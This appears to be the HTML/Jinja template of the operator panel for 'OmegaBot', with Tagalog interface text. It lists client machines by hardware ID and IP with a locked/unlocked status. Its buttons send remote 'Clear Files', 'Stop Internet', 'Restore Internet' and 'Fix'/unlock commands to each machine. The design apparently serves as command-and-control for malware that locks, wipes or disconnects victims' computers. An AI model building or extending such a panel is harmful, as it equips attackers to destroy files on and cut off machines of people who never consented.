<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>OmegaBot Admin Panel</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            background-color: #121212;
            color: #e0e0e0;
            margin: 0;
            padding: 20px;
        }
        h1 {
            color: #ffffff;
            text-align: center;
            margin-bottom: 30px;
        }
        table {
            width: 100%;
            border-collapse: collapse;
            background-color: #1e1e1e;
            box-shadow: 0 4px 6px rgba(0, 0, 0, 0.3);
            border-radius: 8px;
            overflow: hidden;
        }
        th, td {
            padding: 12px 15px;
            text-align: left;
            border-bottom: 1px solid #2c2c2c;
        }
        th {
            background-color: #252525;
            color: #ffffff;
            text-transform: uppercase;
            font-size: 14px;
        }
        tr:hover {
            background-color: #2a2a2a;
        }
        .btn-clear {
            background-color: #ff9800;
            color: white;
            border: none;
            padding: 8px 12px;
            border-radius: 4px;
            cursor: pointer;
            font-weight: bold;
            margin-right: 5px;
            margin-bottom: 5px;
        }
        .btn-clear:hover {
            background-color: #e68900;
        }
        .btn-stop {
            background-color: #f44336;
            color: white;
            border: none;
            padding: 8px 12px;
            border-radius: 4px;
            cursor: pointer;
            font-weight: bold;
            margin-right: 5px;
            margin-bottom: 5px;
        }
        .btn-stop:hover {
            background-color: #d32f2f;
        }
        .btn-restore {
            background-color: #03a9f4;
            color: white;
            border: none;
            padding: 8px 12px;
            border-radius: 4px;
            cursor: pointer;
            font-weight: bold;
            margin-right: 5px;
            margin-bottom: 5px;
        }
        .btn-restore:hover {
            background-color: #0288d1;
        }
        .btn-fix {
            background-color: #4CAF50;
            color: white;
            border: none;
            padding: 8px 12px;
            border-radius: 4px;
            cursor: pointer;
            font-weight: bold;
            margin-bottom: 5px;
        }
        .btn-fix:hover {
            background-color: #45a049;
        }
        .status-locked {
            color: #ff5252;
            font-weight: bold;
        }
        .status-unlocked {
            color: #69f0ae;
            font-weight: bold;
        }
    </style>
</head>
<body>

    <h1>OmegaBot Client Management Panel</h1>

    <table>
        <thead>
            <tr>
                <th>HWID</th>
                <th>IP Address</th>
                <th>Status</th>
                <th>Action State</th>
                <th>Controls</th>
            </tr>
        </thead>
        <tbody>
            {% if users %}
                {% for user in users %}
                <tr>
                    <td><code>{{ user.hwid }}</code></td>
                    <td>{{ user.ip }}</td>
                    <td>
                        <span class="{% if user.status == 'unlocked' %}status-unlocked{% else %}status-locked{% endif %}">
                            {{ user.status | upper }}
                        </span>
                    </td>
                    <td>{{ user.action | default('none') }}</td>
                    <td>
                        <button class="btn-clear" onclick="triggerAction('clear', '{{ user.hwid }}')">Clear Files</button>
                        <button class="btn-stop" onclick="triggerAction('stop_internet', '{{ user.hwid }}')">Stop Internet</button>
                        <button class="btn-restore" onclick="triggerAction('restore_internet', '{{ user.hwid }}')">Restore Internet</button>
                        <button class="btn-fix" onclick="triggerAction('fix', '{{ user.hwid }}')">Fix</button>
                    </td>
                </tr>
                {% endfor %}
            {% else %}
                <tr>
                    <td colspan="5" style="text-align: center; color: #888;">Walang nakarehistrong client sa database.</td>
                </tr>
            {% endif %}
        </tbody>
    </table>

    <script>
        function triggerAction(actionType, hwid) {
            let url = '';
            if (actionType === 'fix' || actionType === 'unlock') {
                url = '/api/fix/' + hwid;
            } else if (actionType === 'clear') {
                url = '/api/clear/' + hwid;
            } else if (actionType === 'stop_internet') {
                url = '/api/stop_internet/' + hwid;
            } else if (actionType === 'restore_internet') {
                url = '/api/restore_internet/' + hwid;
            }
            
            if (confirm('Sigurado ka bang nais mong isagawa ang utos na ' + actionType.toUpperCase() + ' para sa HWID na ito?')) {
                fetch(url, { method: 'POST' })
                    .then(res => res.json())
                    .then(data => {
                        if(data.success) {
                            alert(actionType.toUpperCase() + ' command sent successfully!');
                            location.reload();
                        } else {
                            alert('May error: ' + (data.error || 'Hindi natuloy ang utos.'));
                        }
                    })
                    .catch(err => {
                        alert('Error sa koneksyon sa server.');
                        console.error(err);
                    });
            }
        }
    </script>

</body>
</html>
